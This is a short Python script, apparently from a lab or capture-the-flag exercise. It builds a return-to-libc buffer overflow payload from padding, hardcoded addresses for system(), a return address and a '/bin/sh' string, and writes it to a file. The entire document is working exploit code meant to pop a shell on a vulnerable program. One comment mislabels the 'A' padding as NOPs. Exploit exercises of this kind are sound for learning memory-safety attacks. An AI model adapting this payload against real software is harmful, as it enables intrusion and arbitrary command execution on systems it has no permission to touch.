nopsled = b"A" * 44 #FIll in the buffer with NOPs until we reach the return address

address_of_system = b"\x30\x24\xdc\xf7" # In big endian we would have: 0xf7dc2430

#return_address_of_system = b"\xe8\x6d\xf3\xf7" #0xf7f36de8
return_address_of_system = b"\xd0\x0b\xdb\xf7"


address_of_bin_sh = b"\x52\xd0\xff\xff" #0xffffd052

payload = nopsled + address_of_system + return_address_of_system + address_of_bin_sh

# Write to file
with open("payload_secure", "wb") as f:
        f.write(payload)